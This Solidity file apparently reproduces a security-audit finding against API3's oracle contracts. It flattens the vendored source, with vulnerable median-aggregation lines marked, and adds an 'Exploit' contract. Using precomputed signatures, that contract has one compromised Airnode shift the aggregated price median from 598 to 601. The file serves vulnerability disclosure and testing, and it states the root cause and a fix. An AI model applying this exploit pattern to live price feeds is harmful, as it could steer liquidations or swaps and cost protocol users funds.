// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/*//////////////////////////////////////////////////////////////////////////
    API3 — Compromise of a single oracle enables limited control of the dAPI
    value (Simone Monica, Trail of Bits API3 assessment, finding #17624).

    REAL-SOURCE, cheatcode-free reduction for the EVM Playground.

    Every contract below except `Exploit` is the UNMODIFIED API3
    airnode-protocol-v1 source (github.com/api3dao/airnode-protocol-v1,
    contracts/api3-server-v1 + contracts/utils), flattened into one file so the
    in-browser EVM can compile and record it without imports. `BeaconSetHarness`
    is the same read-only harness the registry Forge test uses (it only exposes
    the inherited beacon-ID derivation and data-feed read helpers).

    The exploit deploys the REAL server and drives the REAL signed-update and
    median-aggregation path. It submits three Airnode-signed beacon updates
    (603, 598, 598), aggregates the beacon set (real median = 598), then submits
    ONE newer signed update for the single compromised Airnode (601) and
    aggregates again. The real Median.median now returns 601 — one compromised
    source moved the dAPI median three units, anywhere inside the honest
    interval [598, 603], with the two honest reports untouched. The attacker
    legitimately holds the compromised Airnode's signing key; the signatures are
    real secp256k1 signatures precomputed for that key (no vm.sign cheatcode).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: DataFeedServer.aggregateBeacons feeds the stored beacon values
    straight into Median.median, and for an odd beacon set the median is simply
    the middle sorted value. There is no quorum, deviation, or freshness guard,
    so a single compromised report selects any point between the two honest
    reports. A consumer that prices collateral/swaps/liquidations directly from
    this value is steered by one source. Fix: enforce source quorum, maximum
    deviation, and freshness at the dAPI or consumer layer.
//////////////////////////////////////////////////////////////*/

// ===========================================================================
// OpenZeppelin ECDSA (v4.9.0) — recover + toEthSignedMessageHash(bytes32).
// The Strings-dependent bytes overload of toEthSignedMessageHash is omitted
// because the API3 signed-update path never uses it; the recover/malleability
// logic that the path DOES use is unmodified.
// ===========================================================================
library ECDSA {
    enum RecoverError {
        NoError,
        InvalidSignature,
        InvalidSignatureLength,
        InvalidSignatureS,
        InvalidSignatureV
    }

    function _throwError(RecoverError error) private pure {
        if (error == RecoverError.NoError) {
            return;
        } else if (error == RecoverError.InvalidSignature) {
            revert("ECDSA: invalid signature");
        } else if (error == RecoverError.InvalidSignatureLength) {
            revert("ECDSA: invalid signature length");
        } else if (error == RecoverError.InvalidSignatureS) {
            revert("ECDSA: invalid signature 's' value");
        }
    }

    function tryRecover(bytes32 hash, bytes memory signature) internal pure returns (address, RecoverError) {
        if (signature.length == 65) {
            bytes32 r;
            bytes32 s;
            uint8 v;
            assembly {
                r := mload(add(signature, 0x20))
                s := mload(add(signature, 0x40))
                v := byte(0, mload(add(signature, 0x60)))
            }
            return tryRecover(hash, v, r, s);
        } else {
            return (address(0), RecoverError.InvalidSignatureLength);
        }
    }

    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        (address recovered, RecoverError error) = tryRecover(hash, signature);
        _throwError(error);
        return recovered;
    }

    function tryRecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address, RecoverError) {
        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
            return (address(0), RecoverError.InvalidSignatureS);
        }
        address signer = ecrecover(hash, v, r, s);
        if (signer == address(0)) {
            return (address(0), RecoverError.InvalidSignature);
        }
        return (signer, RecoverError.NoError);
    }

    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);
        _throwError(error);
        return recovered;
    }

    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32 message) {
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32")
            mstore(0x1c, hash)
            message := keccak256(0x00, 0x3c)
        }
    }
}

// ===========================================================================
// API3 utils interfaces (contracts/utils/interfaces)
// ===========================================================================
interface ISelfMulticall {
    function multicall(bytes[] calldata data) external returns (bytes[] memory returndata);

    function tryMulticall(
        bytes[] calldata data
    ) external returns (bool[] memory successes, bytes[] memory returndata);
}

interface IExtendedSelfMulticall is ISelfMulticall {
    function getChainId() external view returns (uint256);

    function getBalance(address account) external view returns (uint256);

    function containsBytecode(address account) external view returns (bool);

    function getBlockNumber() external view returns (uint256);

    function getBlockTimestamp() external view returns (uint256);

    function getBlockBasefee() external view returns (uint256);
}

// ===========================================================================
// API3 api3-server-v1 interfaces (contracts/api3-server-v1/interfaces)
// ===========================================================================
interface IDataFeedServer is IExtendedSelfMulticall {
    event UpdatedBeaconWithSignedData(bytes32 indexed beaconId, int224 value, uint32 timestamp);

    event UpdatedBeaconSetWithBeacons(bytes32 indexed beaconSetId, int224 value, uint32 timestamp);

    function updateBeaconSetWithBeacons(bytes32[] memory beaconIds) external returns (bytes32 beaconSetId);
}

interface IBeaconUpdatesWithSignedData is IDataFeedServer {
    function updateBeaconWithSignedData(
        address airnode,
        bytes32 templateId,
        uint256 timestamp,
        bytes calldata data,
        bytes calldata signature
    ) external returns (bytes32 beaconId);
}

// ===========================================================================
// API3 utils/SelfMulticall.sol (unmodified)
// ===========================================================================
contract SelfMulticall is ISelfMulticall {
    function multicall(bytes[] calldata data) external override returns (bytes[] memory returndata) {
        uint256 callCount = data.length;
        returndata = new bytes[](callCount);
        for (uint256 ind = 0; ind < callCount; ) {
            bool success;
            (success, returndata[ind]) = address(this).delegatecall(data[ind]);
            if (!success) {
                bytes memory returndataWithRevertData = returndata[ind];
                if (returndataWithRevertData.length > 0) {
                    assembly {
                        let returndata_size := mload(returndataWithRevertData)
                        revert(add(32, returndataWithRevertData), returndata_size)
                    }
                } else {
                    revert("Multicall: No revert string");
                }
            }
            unchecked {
                ind++;
            }
        }
    }

    function tryMulticall(
        bytes[] calldata data
    ) external override returns (bool[] memory successes, bytes[] memory returndata) {
        uint256 callCount = data.length;
        successes = new bool[](callCount);
        returndata = new bytes[](callCount);
        for (uint256 ind = 0; ind < callCount; ) {
            (successes[ind], returndata[ind]) = address(this).delegatecall(data[ind]);
            unchecked {
                ind++;
            }
        }
    }
}

// ===========================================================================
// API3 utils/ExtendedSelfMulticall.sol (unmodified)
// ===========================================================================
contract ExtendedSelfMulticall is SelfMulticall, IExtendedSelfMulticall {
    function getChainId() external view override returns (uint256) {
        return block.chainid;
    }

    function getBalance(address account) external view override returns (uint256) {
        return account.balance;
    }

    function containsBytecode(address account) external view override returns (bool) {
        return account.code.length > 0;
    }

    function getBlockNumber() external view override returns (uint256) {
        return block.number;
    }

    function getBlockTimestamp() external view override returns (uint256) {
        return block.timestamp;
    }

    function getBlockBasefee() external view override returns (uint256) {
        return block.basefee;
    }
}

// ===========================================================================
// API3 api3-server-v1/aggregation/Sort.sol (unmodified)
// ===========================================================================
contract Sort {
    uint256 internal constant MAX_SORT_LENGTH = 9;

    function sort(int256[] memory array) internal pure {
        uint256 arrayLength = array.length;
        require(arrayLength <= MAX_SORT_LENGTH, "Array too long to sort");
        if (arrayLength < 6) {
            if (arrayLength < 4) {
                if (arrayLength == 3) {
                    swapIfFirstIsLarger(array, 0, 1);
                    swapIfFirstIsLarger(array, 1, 2);
                    swapIfFirstIsLarger(array, 0, 1);
                } else if (arrayLength == 2) {
                    swapIfFirstIsLarger(array, 0, 1);
                }
            } else {
                if (arrayLength == 5) {
                    swapIfFirstIsLarger(array, 1, 2);
                    swapIfFirstIsLarger(array, 3, 4);
                    swapIfFirstIsLarger(array, 1, 3);
                    swapIfFirstIsLarger(array, 0, 2);
                    swapIfFirstIsLarger(array, 2, 4);
                    swapIfFirstIsLarger(array, 0, 3);
                    swapIfFirstIsLarger(array, 0, 1);
                    swapIfFirstIsLarger(array, 2, 3);
                    swapIfFirstIsLarger(array, 1, 2);
                } else {
                    swapIfFirstIsLarger(array, 0, 1);
                    swapIfFirstIsLarger(array, 2, 3);
                    swapIfFirstIsLarger(array, 1, 3);
                    swapIfFirstIsLarger(array, 0, 2);
                    swapIfFirstIsLarger(array, 1, 2);
                }
            }
        } else {
            if (arrayLength < 8) {
                if (arrayLength == 7) {
                    swapIfFirstIsLarger(array, 1, 2);
                    swapIfFirstIsLarger(array, 3, 4);
                    swapIfFirstIsLarger(array, 5, 6);
                    swapIfFirstIsLarger(array, 0, 2);
                    swapIfFirstIsLarger(array, 4, 6);
                    swapIfFirstIsLarger(array, 3, 5);
                    swapIfFirstIsLarger(array, 2, 6);
                    swapIfFirstIsLarger(array, 1, 5);
                    swapIfFirstIsLarger(array, 0, 4);
                    swapIfFirstIsLarger(array, 2, 5);
                    swapIfFirstIsLarger(array, 0, 3);
                    swapIfFirstIsLarger(array, 2, 4);
                    swapIfFirstIsLarger(array, 1, 3);
                    swapIfFirstIsLarger(array, 0, 1);
                    swapIfFirstIsLarger(array, 2, 3);
                    swapIfFirstIsLarger(array, 4, 5);
                } else {
                    swapIfFirstIsLarger(array, 0, 1);
                    swapIfFirstIsLarger(array, 2, 3);
                    swapIfFirstIsLarger(array, 4, 5);
                    swapIfFirstIsLarger(array, 1, 3);
                    swapIfFirstIsLarger(array, 3, 5);
                    swapIfFirstIsLarger(array, 1, 3);
                    swapIfFirstIsLarger(array, 2, 4);
                    swapIfFirstIsLarger(array, 0, 2);
                    swapIfFirstIsLarger(array, 2, 4);
                    swapIfFirstIsLarger(array, 3, 4);
                    swapIfFirstIsLarger(array, 1, 2);
                    swapIfFirstIsLarger(array, 2, 3);
                }
            } else {
                if (arrayLength == 9) {
                    swapIfFirstIsLarger(array, 1, 8);
                    swapIfFirstIsLarger(array, 2, 7);
                    swapIfFirstIsLarger(array, 3, 6);
                    swapIfFirstIsLarger(array, 4, 5);
                    swapIfFirstIsLarger(array, 1, 4);
                    swapIfFirstIsLarger(array, 5, 8);
                    swapIfFirstIsLarger(array, 0, 2);
                    swapIfFirstIsLarger(array, 6, 7);
                    swapIfFirstIsLarger(array, 2, 6);
                    swapIfFirstIsLarger(array, 7, 8);
                    swapIfFirstIsLarger(array, 0, 3);
                    swapIfFirstIsLarger(array, 4, 5);
                    swapIfFirstIsLarger(array, 0, 1);
                    swapIfFirstIsLarger(array, 3, 5);
                    swapIfFirstIsLarger(array, 6, 7);
                    swapIfFirstIsLarger(array, 2, 4);
                    swapIfFirstIsLarger(array, 1, 3);
                    swapIfFirstIsLarger(array, 5, 7);
                    swapIfFirstIsLarger(array, 4, 6);
                    swapIfFirstIsLarger(array, 1, 2);
                    swapIfFirstIsLarger(array, 3, 4);
                    swapIfFirstIsLarger(array, 5, 6);
                    swapIfFirstIsLarger(array, 7, 8);
                    swapIfFirstIsLarger(array, 2, 3);
                    swapIfFirstIsLarger(array, 4, 5);
                } else {
                    swapIfFirstIsLarger(array, 0, 7);
                    swapIfFirstIsLarger(array, 1, 6);
                    swapIfFirstIsLarger(array, 2, 5);
                    swapIfFirstIsLarger(array, 3, 4);
                    swapIfFirstIsLarger(array, 0, 3);
                    swapIfFirstIsLarger(array, 4, 7);
                    swapIfFirstIsLarger(array, 1, 2);
                    swapIfFirstIsLarger(array, 5, 6);
                    swapIfFirstIsLarger(array, 0, 1);
                    swapIfFirstIsLarger(array, 2, 3);
                    swapIfFirstIsLarger(array, 4, 5);
                    swapIfFirstIsLarger(array, 6, 7);
                    swapIfFirstIsLarger(array, 3, 5);
                    swapIfFirstIsLarger(array, 2, 4);
                    swapIfFirstIsLarger(array, 1, 2);
                    swapIfFirstIsLarger(array, 3, 4);
                    swapIfFirstIsLarger(array, 5, 6);
                    swapIfFirstIsLarger(array, 2, 3);
                    swapIfFirstIsLarger(array, 4, 5);
                    swapIfFirstIsLarger(array, 3, 4);
                }
            }
        }
    }

    function swapIfFirstIsLarger(int256[] memory array, uint256 ind1, uint256 ind2) private pure {
        if (array[ind1] > array[ind2]) {
            (array[ind1], array[ind2]) = (array[ind2], array[ind1]);
        }
    }
}

// ===========================================================================
// API3 api3-server-v1/aggregation/QuickSelect.sol (unmodified)
// ===========================================================================
contract Quickselect {
    function quickselectK(int256[] memory array, uint256 k) internal pure returns (uint256 indK) {
        uint256 arrayLength = array.length;
        assert(arrayLength > 0);
        unchecked {
            (indK, ) = quickselect(array, 0, arrayLength - 1, k, false);
        }
    }

    function quickselectKPlusOne(
        int256[] memory array,
        uint256 k
    ) internal pure returns (uint256 indK, uint256 indKPlusOne) {
        uint256 arrayLength = array.length;
        assert(arrayLength > 1);
        unchecked {
            (indK, indKPlusOne) = quickselect(array, 0, arrayLength - 1, k, true);
        }
    }

    function quickselect(
        int256[] memory array,
        uint256 lo,
        uint256 hi,
        uint256 k,
        bool selectKPlusOne
    ) private pure returns (uint256 indK, uint256 indKPlusOne) {
        if (lo == hi) {
            return (k, 0);
        }
        uint256 indPivot = partition(array, lo, hi);
        if (k < indPivot) {
            unchecked {
                (indK, ) = quickselect(array, lo, indPivot - 1, k, false);
            }
        } else if (k > indPivot) {
            unchecked {
                (indK, ) = quickselect(array, indPivot + 1, hi, k, false);
            }
        } else {
            indK = indPivot;
        }
        if (selectKPlusOne) {
            unchecked {
                indKPlusOne = indK + 1;
            }
            uint256 i;
            unchecked {
                i = indKPlusOne + 1;
            }
            uint256 arrayLength = array.length;
            for (; i < arrayLength; ) {
                if (array[i] < array[indKPlusOne]) {
                    indKPlusOne = i;
                }
                unchecked {
                    i++;
                }
            }
        }
    }

    function partition(
        int256[] memory array,
        uint256 lo,
        uint256 hi
    ) private pure returns (uint256 pivotInd) {
        if (lo == hi) {
            return lo;
        }
        int256 pivot = array[lo];
        uint256 i = lo;
        unchecked {
            pivotInd = hi + 1;
        }
        while (true) {
            do {
                unchecked {
                    i++;
                }
            } while (i < array.length && array[i] < pivot);
            do {
                unchecked {
                    pivotInd--;
                }
            } while (array[pivotInd] > pivot);
            if (i >= pivotInd) {
                (array[lo], array[pivotInd]) = (array[pivotInd], array[lo]);
                return pivotInd;
            }
            (array[i], array[pivotInd]) = (array[pivotInd], array[i]);
        }
    }
}

// ===========================================================================
// API3 api3-server-v1/aggregation/Median.sol (unmodified)
// ===========================================================================
contract Median is Sort, Quickselect {
    function median(int256[] memory array) internal pure returns (int256) {
        uint256 arrayLength = array.length;
        if (arrayLength <= MAX_SORT_LENGTH) {
            sort(array);
            if (arrayLength % 2 == 1) {
                return array[arrayLength / 2]; // @> VULN: odd-set median is the middle sorted report, no partial-compromise resistance
            } else {
                assert(arrayLength != 0);
                unchecked {
                    return average(array[arrayLength / 2 - 1], array[arrayLength / 2]);
                }
            }
        } else {
            if (arrayLength % 2 == 1) {
                return array[quickselectK(array, arrayLength / 2)];
            } else {
                uint256 mid1;
                uint256 mid2;
                unchecked {
                    (mid1, mid2) = quickselectKPlusOne(array, arrayLength / 2 - 1);
                }
                return average(array[mid1], array[mid2]);
            }
        }
    }

    function average(int256 x, int256 y) private pure returns (int256) {
        unchecked {
            int256 averageRoundedDownToNegativeInfinity = (x >> 1) + (y >> 1) + (x & y & 1);
            return
                averageRoundedDownToNegativeInfinity +
                (int256((uint256(averageRoundedDownToNegativeInfinity) >> 255)) & (x ^ y));
        }
    }
}

// ===========================================================================
// API3 api3-server-v1/DataFeedServer.sol (unmodified)
// ===========================================================================
contract DataFeedServer is ExtendedSelfMulticall, Median, IDataFeedServer {
    using ECDSA for bytes32;

    struct DataFeed {
        int224 value;
        uint32 timestamp;
    }

    mapping(bytes32 => DataFeed) internal _dataFeeds;

    modifier onlyValidTimestamp(uint256 timestamp) virtual {
        unchecked {
            require(timestamp < block.timestamp + 1 hours, "Timestamp not valid");
        }
        _;
    }

    function updateBeaconSetWithBeacons(
        bytes32[] memory beaconIds
    ) public override returns (bytes32 beaconSetId) {
        (int224 updatedValue, uint32 updatedTimestamp) = aggregateBeacons(beaconIds);
        beaconSetId = deriveBeaconSetId(beaconIds);
        DataFeed storage beaconSet = _dataFeeds[beaconSetId];
        if (beaconSet.timestamp == updatedTimestamp) {
            require(beaconSet.value != updatedValue, "Does not update Beacon set");
        }
        _dataFeeds[beaconSetId] = DataFeed({value: updatedValue, timestamp: updatedTimestamp});
        emit UpdatedBeaconSetWithBeacons(beaconSetId, updatedValue, updatedTimestamp);
    }

    function _readDataFeedWithId(
        bytes32 dataFeedId
    ) internal view returns (int224 value, uint32 timestamp) {
        DataFeed storage dataFeed = _dataFeeds[dataFeedId];
        (value, timestamp) = (dataFeed.value, dataFeed.timestamp);
        require(timestamp > 0, "Data feed not initialized");
    }

    function deriveBeaconId(address airnode, bytes32 templateId) internal pure returns (bytes32 beaconId) {
        beaconId = keccak256(abi.encodePacked(airnode, templateId));
    }

    function deriveBeaconSetId(bytes32[] memory beaconIds) internal pure returns (bytes32 beaconSetId) {
        beaconSetId = keccak256(abi.encode(beaconIds));
    }

    function processBeaconUpdate(
        bytes32 beaconId,
        uint256 timestamp,
        bytes calldata data
    ) internal onlyValidTimestamp(timestamp) returns (int224 updatedBeaconValue) {
        updatedBeaconValue = decodeFulfillmentData(data);
        require(timestamp > _dataFeeds[beaconId].timestamp, "Does not update timestamp");
        _dataFeeds[beaconId] = DataFeed({value: updatedBeaconValue, timestamp: uint32(timestamp)});
    }

    function decodeFulfillmentData(bytes memory data) internal pure returns (int224) {
        require(data.length == 32, "Data length not correct");
        int256 decodedData = abi.decode(data, (int256));
        require(
            decodedData >= type(int224).min && decodedData <= type(int224).max,
            "Value typecasting error"
        );
        return int224(decodedData);
    }

    function aggregateBeacons(
        bytes32[] memory beaconIds
    ) internal view returns (int224 value, uint32 timestamp) {
        uint256 beaconCount = beaconIds.length;
        require(beaconCount > 1, "Specified less than two Beacons");
        int256[] memory values = new int256[](beaconCount);
        int256[] memory timestamps = new int256[](beaconCount);
        for (uint256 ind = 0; ind < beaconCount; ) {
            DataFeed storage dataFeed = _dataFeeds[beaconIds[ind]];
            values[ind] = dataFeed.value;
            timestamps[ind] = int256(uint256(dataFeed.timestamp));
            unchecked {
                ind++;
            }
        }
        value = int224(median(values)); // @> VULN: one compromised report steers the aggregated dAPI value
        timestamp = uint32(uint256(median(timestamps)));
    }
}

// ===========================================================================
// API3 api3-server-v1/BeaconUpdatesWithSignedData.sol (unmodified)
// ===========================================================================
contract BeaconUpdatesWithSignedData is DataFeedServer, IBeaconUpdatesWithSignedData {
    using ECDSA for bytes32;

    function updateBeaconWithSignedData(
        address airnode,
        bytes32 templateId,
        uint256 timestamp,
        bytes calldata data,
        bytes calldata signature
    ) external override returns (bytes32 beaconId) {
        require(
            (keccak256(abi.encodePacked(templateId, timestamp, data)).toEthSignedMessageHash()).recover(
                signature
            ) == airnode,
            "Signature mismatch"
        );
        beaconId = deriveBeaconId(airnode, templateId);
        int224 updatedValue = processBeaconUpdate(beaconId, timestamp, data);
        emit UpdatedBeaconWithSignedData(beaconId, updatedValue, uint32(timestamp));
    }
}

// ===========================================================================
// Test-only read helpers (identical to the registry Forge test harness): all
// authentication, storage, aggregation, sorting, and median selection execute
// from the vendored API3 source above.
// ===========================================================================
contract BeaconSetHarness is BeaconUpdatesWithSignedData {
    function beaconId(address airnode, bytes32 templateId) external pure returns (bytes32) {
        return deriveBeaconId(airnode, templateId);
    }

    function read(bytes32 dataFeedId) external view returns (int224 value, uint32 timestamp) {
        return _readDataFeedWithId(dataFeedId);
    }
}

// ===========================================================================
// Cheatcode-free exploit. The attacker holds the compromised Airnode's signing
// key; the four signatures below are REAL secp256k1 signatures precomputed for
// the three Airnode keys over the exact API3 signed-update digest
// (toEthSignedMessageHash(keccak256(templateId, timestamp, abi.encode(value)))).
// The recorder runs with block.timestamp pinned to REPORT_TS via
// setup.blockTimestamp so the real onlyValidTimestamp gate accepts the reports.
// ===========================================================================
contract Exploit {
    BeaconSetHarness public server;

    // Airnode addresses (derived from keys 0x101, 0x202, 0x303).
    address private constant AIRNODE0 = 0x25A71a07cecf1753ee65b00E0a3AAEf7e0F51c0F;
    address private constant AIRNODE1 = 0x86b1B106aeac5c5d2b16F9596755811CF976f34E;
    address private constant AIRNODE2 = 0x87ee0998F32AF3617fCFbe1A745A413238896270;

    bytes32 private constant TEMPLATE0 = bytes32(uint256(0x10));
    bytes32 private constant TEMPLATE1 = bytes32(uint256(0x11));
    bytes32 private constant TEMPLATE2 = bytes32(uint256(0x12));

    uint256 private constant REPORT_TS = 1700000000; // == setup.blockTimestamp
    uint256 private constant REPORT_TS2 = 1700000001;

    // Real secp256k1 signatures (r||s||v, 65 bytes) over the API3 digest.
    bytes private constant SIG0_603 =
        hex"b2fb9dac091b14229c3226869cfb47662700ed739db1eb74a8bf943c9bd90dd862527be052cfb7fa86ff82a4f2a2ac477dead50aff843276af1bbdf3d67ae7b41c";
    bytes private constant SIG1_598 =
        hex"efb711200a4981d76632c08f514e1ca775097981c8d5bd46adb4658102c6b6e43e3d977f72000d42063ff2e9798656c857d70dcfc00c694cbdd9ba251d3e9a691c";
    bytes private constant SIG2_598 =
        hex"e329a4411de479fc134c118c36e8acfe6d21114f0782016709350a13e933a766791059ea12e6a5055a2fe23f72583918ed2d84b8206297d538ed7d587f8e93721b";
    bytes private constant SIG2_601 =
        hex"1d78e93cdba0300b346b9d90a61b461cc34d0d716d367b31999dd00bc9c0d95546db7d34bda51a6b994265009600ec002f379d920f44d43f633ad2b4740c8b5c1b";

    receive() external payable {}

    function run() external payable {
        server = new BeaconSetHarness();

        bytes32 id0 = server.beaconId(AIRNODE0, TEMPLATE0);
        bytes32 id1 = server.beaconId(AIRNODE1, TEMPLATE1);
        bytes32 id2 = server.beaconId(AIRNODE2, TEMPLATE2);

        // Two honest Airnodes report 603 and 598; the compromised third reports
        // the low honest endpoint 598. All three go through the REAL signed-data
        // authentication path with real secp256k1 signatures.
        server.updateBeaconWithSignedData(AIRNODE0, TEMPLATE0, REPORT_TS, abi.encode(int256(603)), SIG0_603);
        server.updateBeaconWithSignedData(AIRNODE1, TEMPLATE1, REPORT_TS, abi.encode(int256(598)), SIG1_598);
        server.updateBeaconWithSignedData(AIRNODE2, TEMPLATE2, REPORT_TS, abi.encode(int256(598)), SIG2_598);

        bytes32[] memory beaconIds = new bytes32[](3);
        beaconIds[0] = id0;
        beaconIds[1] = id1;
        beaconIds[2] = id2;

        bytes32 beaconSetId = server.updateBeaconSetWithBeacons(beaconIds);
        (int224 initialMedian, ) = server.read(beaconSetId);
        require(initialMedian == 598, "baseline median unexpected");

        // ONLY the compromised source submits a newer signed report (601). The
        // two honest reports are untouched.
        server.updateBeaconWithSignedData(AIRNODE2, TEMPLATE2, REPORT_TS2, abi.encode(int256(601)), SIG2_601);
        server.updateBeaconSetWithBeacons(beaconIds);
        (int224 manipulatedMedian, ) = server.read(beaconSetId);

        // Harm: one compromised oracle moved the real API3 dAPI median three
        // units, to a value it chose inside the honest interval [598, 603],
        // with no quorum/deviation/circuit-breaker to stop it.
        require(manipulatedMedian == 601, "single oracle did not steer median");
        require(manipulatedMedian - initialMedian == 3, "unexpected median shift");
    }
}
